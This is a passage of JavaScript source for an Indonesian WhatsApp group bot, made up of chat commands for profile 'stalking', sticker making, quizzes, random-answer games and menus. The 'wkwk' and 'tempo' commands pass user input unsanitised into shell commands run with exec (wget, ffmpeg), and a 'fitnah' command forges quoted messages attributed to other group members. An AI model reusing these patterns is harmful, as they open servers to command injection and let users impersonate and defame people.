					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Publick : ${get_result.public_repos}\n`
					txt += `Public Gits : ${get_result.public_gists}\n`
					txt += `User : ${get_result.user}\n`
					txt += `Compi : ${get_result.company}\n`
					txt += `Lokasi : ${get_result.location}\n`
					txt += `Email : ${get_result.email}\n`
					txt += `Bio : ${get_result.bio}\n`
					Buffer = await getBuffer(get_result.avatar)
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko, caption: txt})
					break
		case 'tkstalk':
			if (!isRegistered) return reply(aml.noregis)
			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolhuman}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					Bug = await getBuffer(get_result.user_picture)
					aldi.sendMessage(from, Bug, image, {quoted: ftoko, caption: txt})
					break
		case 'ytstalk':
					if (!isRegistered) return reply(aml.noregis)
					ytk = `${body.slice(11)}`
					anu = await fetchJson(`http://api.lolhuman.xyz/api/ytchannel?apikey=RiuApikey&query=${ytk}`, {method: 'get'})
					cari = '•••••••••••••••••\n'
					for (let search of anu.result) {
						cari += `Channel : ${search.channel_name}\nInfo : ${search.channel_about}\nCreated : ${search.channel_created}\nLink : https://youtu.com/channel/${search.channel_id}\n•••••••••••••••••\n`
					}
					reply(cari.trim())
					break
					case 'takestick':
		if (!isRegistered) return reply(aml.noregis)
                    if ((isMedia && !lol.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore|Ganz`)
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(lol).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await aldi.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join('  ').split("|")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${lolhuman}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_kontol = fs.readFileSync(file_name)
                            aldi.sendMessage(from, ini_kontol, sticker, { quoted: fkontak })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                    case 'attp2':
		if (!isRegistered) return reply(aml.noregis)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore`)
                    ini_txt = args.join('  ')
                    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/attp?apikey=${lolhuman}&text=${ini_txt}`)
                    aldi.sendMessage(from, ini_kontol, sticker, { quoted: fkontak})
                    break
                    case 'kickall':
                    if (!isOwner) return reply(aml.ownerb)
			if (!isGroupAdmins) return reply(aml.admin)
			        members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `😘 ${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					aldi.groupRemove(from, members_id)
					break 
					case 'setreply':
					if (!isOwner) return reply(aml.ownerb)
                	aldi.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					cr = args.join('  ')
					reply(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break 
					case 'audioquran':
					if (isBanned) return reply(aml.baned)
					if (!isRegistered) return reply(aml.noregis)
					reply(`[❗] Wait Bro Rada Lama Durasinya 30 Menit`)
					kontol = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/18?apikey=${lolhuman}`)
					aldi.sendMessage(from, kontol, audio, {mimetype: 'audio/mp4', filename: `masyaallah.mp3`, quoted: fkontak })
					break
					
					case 'blocklist':
					teks = 'List Beban Kontak :\n'
					for (let block of blocked) {
						teks += `➢ @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					aldi.sendMessage(from, teks.trim(), extendedText, {quoted: ftoko, contextInfo: {"mentionedJid": blocked}})
					break
		case 'daftar':
                if (isRegistered) return reply(aml.rediregis)
                const seriTod = bikinSerial(20)
				veri = sender
              _registered.push(sender)
				fs.writeFileSync('./database/bot/registered.json', JSON.stringify(_registered))
				jadiUser(sender, seriTod)
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
				const kentod = 
`
┌──❲ DAFTAR BERHASIL ❳     
├▢ *Nama* : ${pushname}
├▢ *Nomor* : @${sender.split('@')[0]}
├▢ *SN :* ${seriTod}
├▢ *Total Pengguna :* ${_registered.length} Orang
├▢  *Status :* ☑️TERDAFTAR
└──────────────⧉
┌──❲ WAKTU PENDAFTARAN ❳     
├▢ *Hari :* ${tampilHari}
├▢ *Jam :* ${time}
├▢ TERIMA KASIH SUDAH DAFTAR
├▢ KETIK ${prefix}menu untuk mulai bot  
└──────────────⧉`
                aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: kentod})
                break
            	case 'mining':
                      if (!isRegistered) return reply(aml.noregis)
		              if (isBanned) return reply(aml.baned)
                      if (isLimit(sender)) return reply(aml.limitend)
                      if (!isEventon) return reply(`maaf ${pushname} event mining tidak di aktifkan oleh owner`)
                      if (isOwner) {
                      const one = 999999999
                      addLevelingXp(sender, one)
                      addLevelingLevel(sender, 99)
                      reply(`Nih Untukmu Owner♥ ${one}Xp `)
                      }else{
                      const mining = Math.ceil(Math.random()*  10000)
                      addLevelingXp(sender, mining)
                      await reply(`selamat ${pushname} kamu mendapatkan ${mining}Xp`)
                      }
                    await limitAdd(sender)
					break
				case 'bisakah':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','kontol Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() *   bisa.length)]
					aldi.sendMessage(from, 'Pertanyaan : '+bisakah+'\n\nJawaban : '+ keh, text, { quoted: fkontak })
					await limitAdd(sender)
					break
				case 'kapankah':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() *   kapan.length)]
					aldi.sendMessage(from, 'Pertanyaan : '+kapankah+'\n\nJawaban : '+ koh, text, { quoted: fkontak })
					await limitAdd(sender)
					break
         case 'apakah':
         	 	  if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','kontol Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() *   apa.length)]
					aldi.sendMessage(from, 'Pertanyaan : '+apakah+'\n\nJawaban : '+ kah, text, { quoted: fkontak })
					await limitAdd(sender)
					break
	     case 'rate':
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() *   ra.length)]
					aldi.sendMessage(from, 'Pertanyaan : '+rate+'\n\nJawaban : '+ te+'%', text, { quoted: fkontak })
					await limitAdd(sender)
					break
		case 'babi':
		            if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
		            if (isLimit(sender)) return reply(aml.limitend)
		            if (!isGroup) return reply(aml.groupo)
                    const gmek = await aldi.getGroupMembersId(groupId)
                    let gmik = gmek[Math.floor(Math.random() *   gmek.length)]
                    const mmkk = `YANG PALING BABI DISINI ADALAH @${gmik.replace(/@c.us/g, '')}`
                    aldi.sendTextWithMentions(dari, mmkk, id)
                    break
         case 'nulis2':
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				nabi = args.join('  ')
				reply (aml.wait)
				gam = await getBuffer(`http://api.lolhuman.xyz/api/nulis?apikey=${lolhuman}&text=${nabi}`)
				aldi.sendMessage(from, gam, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
		case 'nulis3':		
                 if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				nabi = args.join('  ')
				reply (aml.wait)
				Buffer = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${nabi}&apikey=apivinz`, {method: 'get'})
				aldi.sendMessage(from, Buffer, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
				case 'nulis4':		
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				nabi = args.join('  ')
				reply (aml.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/magernulis3?text=${nabi}&APIKEY=${xteam}`, {method: 'get'})
				aldi.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
				case 'nulis5':		
                if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
				nabi = args.join('  ')
				reply (aml.wait)
				buffer = await getBuffer(`https://api.xteam.xyz/magernulis5?text=${nabi}&APIKEY=${xteam}`, {method: 'get'})
				aldi.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: fkontak})
				await limitAdd(sender)
				break
                case 'magernulis':
                    aldi.updatePresence(from, Presence.composing)
	                if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                    if (isLimit(sender)) return reply(aml.limitend)
                    await limitAdd(sender)
                    if (args.length < 1) return reply(`[❗] Example :\n${prefix}${command} nama & kelas & nulis`)
                    var F = args.join('  ')
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
                    reply(aml.wait)
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${xteam}`)
                    aldi.sendMessage(from, anu, image, {caption: `nih kak`, quoted: fkontak})
                    break
        case 'audio':
      aldi.updatePresence(from, Presence.composing)
	if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		    reply (ind.wait)
				 ayam = fs.readFileSync('./Agan/music.js');
                 jsonData = JSON.parse(ayam);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                aldi.sendMessage(from, ayam, audio, {mimetype: 'audio/mp3', filename: `.mp3`, quoted: fkontak})
				break
	case 'nulis':
	case 'tulis':
	aldi.updatePresence(from, Presence.composing)
	if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           if (isLimit(sender)) return reply(aml.limitend)
			if (args.length < 1) return reply(`${name} Harus Nulis Apa Kak??`)
			reply (aml.wait)
					tulis = body.slice(7)
					nulis = await getBuffer(`https://bsbt-api-rest.herokuapp.com/api/maker/nulis?apikey=${Beni}&text=${tulis}`, {method: 'get'})
					aldi.sendMessage(from, nulis, image, {quoted: fkontak})
					await limitAdd(sender) 
					break  
				case 'quran':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           		if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
					quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
					aldi.sendMessage(from, quran, text, {quoted: fkontak})
					await limitAdd(sender) 
					break 
			case 'pasangan':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           		if (isLimit(sender)) return reply(aml.limitend)
				pa = `${args.join('  ')}`
				sa = pa.split("/")[0];
				ngan = pa.split("/")[1];
				anu = await fetchJson(`https://api.vhtear.com/primbonjodoh?nama=${sa}&pasangan=${ngan}&apikey=${apivhtear}`, {method: 'get'})
				aldi.sendMessage(from, `${anu.result.hasil}`, {quoted: fkontak})
				await limitAdd(sender) 
				break 
	  case 'seberapagay':
           if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           if (isLimit(sender)) return reply(aml.limitend)
		teks = body.slice(1)
		   anu = await fetchJson(`https://arugaz.herokuapp.com/api/howgay`, {method: 'get'})
		   hasil = `Nih Liat Data Gay Si ${teks}\n\n\nPersentase Gay : ${anu.persen}%\nAlert!!! : ${anu.desc}`
		   reply(hasil)
		   await limitAdd(sender)
		   break
				case 'pbucin':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           			if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply('Mana Nama?')
				rate = body.slice(8)
				const pbucin = persenbucin[Math.floor(Math.random() *   persenbucin.length)]
				aldi.sendMessage(from, 'Persen Bucin Kak: '+rate+'\n\nJawaban : '+ pbucin +'', text, { quoted: fkontak })
				await limitAdd(sender) 
				break 
			
		case 'anime':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzKey}`, {method: 'get'})
					reply (aml.wait)
					pok = await getBuffer(anu.result)
					aldi.sendMessage(from, pok, image, { quoted: fkontak , caption: 'nihhh'})
					await limitAdd(sender) 
					break  
                case 'kucing':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=kucing`, {method: 'get'})
					reply (aml.wait)
					n = JSON.parse(JSON.stringify(anu));
					nimek =  n[Math.floor(Math.random() *   n.length)];
					pok = await getBuffer(nimek)
					aldi.sendMessage(from, pok, image, { quoted: fkontak , caption: 'nyang🐈'})
					await limitAdd(sender) 
					break 
		case 'fitnah':
		if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)				
		if (!isGroup) return reply(aml.groupo)                 
				if (args.length < 1) return reply(`Gini kak : ${prefix}fitnah [@tag&pesan&balasanbot]\n\nContoh : ${prefix}fitnah @tagmember&hai&hai juga`)
				var gh = body.slice(8)
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					var replace = gh.split("&")[0];
					var target = gh.split("&")[1];
					var bot = gh.split("&")[2];
					aldi.sendMessage(from, `${bot}`, text, {quoted: { mek: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
					break
					case 'ntahlah':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query={body.slice(11)}&apikey=${apivhtear}`, {method: 'get'})
					var inu = JSON.parse(JSON.stringify(anu.result));
					var uni =  inu[Math.floor(Math.random() *   inu.length)];
					nye = await getBuffer(uni)
					aldi.sendMessage(from, nye, image, { caption: 'Inu!!', quoted: fkontak })
					break
	case 'hobby':
           if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
           if (isLimit(sender)) return reply(aml.limitend)
					hobby = body.slice(1)
					const hob =['Desah Di Game','Ngocokin Doi','Stalking sosmed nya mantan','Kau kan gak punya hobby awokawok','Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri','Nonton Wibu']
					const by = hob[Math.floor(Math.random() *   hob.length)]
					aldi.sendMessage(from, 'Pertanyaan : '+hobby+'\n\nJawaban : '+ by, text, { quoted: fkontak })
					await limitAdd(sender)
					break
				case 'meme':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					meme = await kagApi.memes()
					kontol = await getBuffer(`https://bsbt-api-rest.herokuapp.com/api/random/meme?apikey=${Beni}`)
					aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: '.......'})
					break
				case 'memeindo2':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				reply (aml.wait)
					memein = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=${ZeksApi}`)
					kondom = await getBuffer(memein.result)
					aldi.sendMessage(from, kondom, image, {quoted: ftoko, caption: '.......'})
					await limitAdd(sender)
					break 
					 case 'tebakkimia':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)
		if (!isGroup) return reply(aml.groupo)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${lolhuman}`, {method: 'get'})
					kimia = `${anu.result.nama}`
					setTimeout( () => {
					aldi.sendMessage(from, '➸ Jawaban : '+anu.result.lambang, text, {quoted: fkontak}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, kimia, text, {quoted: ftoko }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
		case 'tebaklirik':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)
		if (!isGroup) return reply(aml.groupo)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${lolhuman}`, {method: 'get'})
					lirik = `${anu.result.question}`
					setTimeout( () => {
					aldi.sendMessage(from, '➸ Jawaban : '+anu.result.answer, text, {quoted: fkontak}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, lirik, text, {quoted: ftoko }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
					case 'wkwk':
		if (!isRegistered) return reply(ind.noregis())
                    ini_url = args[0]
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/editor/triggered?apikey=${lolkey}&img=${ini_url}`
                    exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (e) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        aldi.sendMessage(from, buff, sticker, { quoted: Arya})
                        fs.unlinkSync(rano)
                    })
                    break
					case 'tempo':
					if (args.length < 1) return reply(`Gini kak : ${prefix}tempo 36\n\nContoh : ${prefix}tempo 9999`)
                    var req = args.join('  ')            
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						aldi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fkontak,duration:999999999999})
						fs.unlinkSync(ran)
					})
				break
					case 'xox':
	if (!isRegistered) return reply(aml.noregis)
		const exo = [
		'X : X : O',
		'O : X : O',
		'X : O : O',
		'O : X : X',
		'O : X : O',
		'X : O : O',
	        'X : X : O',
		'X : X : X',
		'O : O : O',
		]
            const boxo = exo[Math.floor(Math.random() *   exo.length)]
	riucuy = `[  🎰 | X O X ]\n-------------------------\n\n ${boxo}\n\n-------------------------\nKeterangan : Jika anda Mendapatkan Huruf X 3 Huruf Berarti Anda Menang\nContoh : X : X : X`
            reply(riucuy)
	            break
					case 'suit':
		if (!isRegistered) return reply(aml.noregis)
		if (args.length < 1) return reply(`Gini kak : ${prefix}suit batu\n\nContoh : ${prefix}suit kertas`)
		query = args.join('  ')
		const botol = ['Batu','Gunting','Kertas']
            const suitcuy = botol[Math.floor(Math.random() *   botol.length)]
	brow = `
BOT
> ${suitcuy}
KAMU
> ${query}
`
            reply(brow)
	            break
		case 'caklontong':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)
		if (!isGroup) return reply(aml.groupo)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/caklontong?apikey=${lolhuman}`, {method: 'get'})
					caklontong = `${anu.result.question}`
					setTimeout( () => {
					aldi.sendMessage(from, '➸ Jawaban : '+anu.result.jawaban+ '\n\n• Penjelasan: '+ anu.result.desk+'', text, {quoted: fkontak}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, caklontong, text, {quoted: fkontak}) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
					case 'sourcecode':
					case 'sc':
				        var value = (` https://youtube.com/channel/UCEdBG1SFYDwLyZNmGHlfq6w`)
				        var group = await aldi.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map( async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                       var options = {
                       text: value,
                       contextInfo: { mentionedJid: mem },
                       quoted: fkatalok
                       }
                       aldi.sendMessage(from, options, text, {quoted: fkatalok})
					   break
			case 'test':
			if (!isOwner) return reply(aml.ownerb)
				var value = (`Sip Online! Prefix Nih = ${prefix}`)
                var group = await aldi.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map( async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                text: value,
                contextInfo: { mentionedJid: mem },
                quoted: fkatalok
                }
                aldi.sendMessage(from, options, text, {quoted: fkatalok})
					   break
					  
			case 'family100':
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)
		if (!isGroup) return reply(aml.groupo)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolhuman}`, {method: 'get'})
					family = `${anu.result.question}`
					setTimeout( () => {
					aldi.sendMessage(from, '➸ Jawaban : '+anu.result.jawaban, text, {quoted: fkontak}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, family, text, {quoted: ftoko }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
					case 'ping':
         	if (isBanned) return reply(ind.baned())
          	if (!isRegistered) return reply(ind.noregis())
           	await aldi.sendMessage(from, `Pong!!!!\nSpeed: ${processTime(time, moment())} _Second_`)
		      break
					       
               	case 'menu2':
               	case 'list':
               if (!isRegistered) return reply(aml.noregis)
		       if (isBanned) return reply(aml.baned)
		       if (isLimit(sender)) return reply(aml.limitend)
		      uptime = process.uptime()
               const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model, device_network, cpu_device, device_battery, device_ram } = aldi.user.phone 
               list = [{title: `ini command nya kak ${pushname}`,
                    rows: [
                       {
                        title: `menuowner`,
                        description: `*Features For Owners Bot*`,
                        rowId: `${prefix}menuowner`
                      },{
                        title: `menugroup`,
                        description: `*Fitur Features for group admins*`,
                        rowId: `${prefix}menugroup`
                      },{
                        title: `menulimit`,
                        description: `*Features For User Bot*`,
                        rowId: `${prefix}menulimit`
                      },{                   
                        title: `menusound`,
                        description: `*Features For Fun*`,
                        rowId: `${prefix}menusound`
                      },{
                        title: `menumedia`,
                        description: `*social media to find things*`,
                        rowId: `${prefix}menumedia`
                      },{
                        title: `menuasupan`,
                        description: `*intake menu to relieve your stress*`,
                        rowId: `${prefix}menuasupan`
                      },{
                        title: `menunews`,
                        description: `*Latest features Fitur*`,
                        rowId: `${prefix}menunews`
                      },{
                        title: `menuislam`,
                        description: `*features for Islam*`,
                        rowId: `${prefix}menuislam`
                      },{
                        title: `menuother`,
                        description: `*can only be used by the owner*`,
                        rowId: `${prefix}menuother`
                      },{
                        title: `menunew`,
                        description: `*can only be used by group admins*`,
                        rowId: `${prefix}menunew`
                      },{
                        title: `menusearch`,
                        description: `*limit for registered members*`,
                        rowId: `${prefix}menusearch`
                      },{
                        title: `menumaker`,
                        description: `*music for entertainment/fun*`,
                        rowId: `${prefix}menumaker`
                      },{
                        title: `menuimage`,
                        description: `*social media to find things*`,
                        rowId: `${prefix}menuimage`
                      },{
                        title: `menusticker`,
                        description: `*intake menu to relieve your stress*`,
                        rowId: `${prefix}menusticker`
                      },{
                        title: `menulink`,
                        description: `*Latest features Fitur*`,
                        rowId: `${prefix}menulink`
                      },{
                        title: `menufun`,
                        description: `*features for Islam*`,
                        rowId: `${prefix}menufun`
                      },{
                        title: `menunulis`,
                        description: `*features to customize tasks*`,
                        rowId: `${prefix}menunulis`
                      },{
                        title: `menuanime`,
                        description: `*animated features for kids*`,
                        rowId: `${prefix}menuanime`
                      },{
                        title: `menudownload`,
                        description: `*feature to download songs or videos*`,
                        rowId: `${prefix}menudownload`
                        },{
                        title: `menuconvert`,
                        description: `*feature to change any sound*`,
                        rowId: `${prefix}menuconvert`
                      },{
                        title: `menunsfw`,
                        description: `*features for sexx or 18+*`,
                        rowId: `${prefix}menunsfw`
                      },{
                        title: `menu`,
                        description: `*Features for username sultan*`,
                        rowId: `${prefix}menu`
                      },{
                        title: `infodeveloper`,
                        description: `*Features for username sultan*`,
                        rowId: `${prefix}infodeveloper`
                     },{
                        title: `infobot`,
                        description: `*Features for username sultan*`,
                        rowId: `${prefix}infobot`
                     },{
                        title: `owner`,
                        description: `*bot owner*`,
                        rowId: `${prefix}owner`
                      },{
                        title: `sewabot`,
                        description: `*Kalau Mau Sewa Bot Klik Dsni kak ${pushname}*`,
                        rowId: `${prefix}sewa`
                     }
                  ]
                }]
               listmsg(from, `⦿ Jam : ${tampilJam}\n⦿ Hari : ${tampilHari}
`, `Klik Di Bawah Untuk Memilih Menu☟ ☟ ☟`, list)
     break
      
case 'help':   
case 'menu':
                 if (!isRegistered) return reply(aml.noregis)
				 if (isBanned) return reply(aml.baned)
				reply('「 *WAIT PROSES !!* 」 ')
		      wew = fs.readFileSync(`./aldiganz/R.jpg`)
				eme = `
═════〘 ALPHABOT 〙═════

□ nama : ${pushname}
□ nomor : @${sender.split('@')[0]}

「 𝗜𝗡𝗙𝗢 & 𝗕𝗢𝗧 」  
□ nama : ${namabot}
□ author : ɪᴛsᴍᴇᴀʟᴅɪ 
□ ᴘʀᴇғɪx : ${prefix}
□ sᴇʀᴠᴇʀ : ${aldi.browserDescription[0]}
□ ᴜsᴇʀʀɪɢɪᴇsᴛᴇʀ : ${_registered.length}

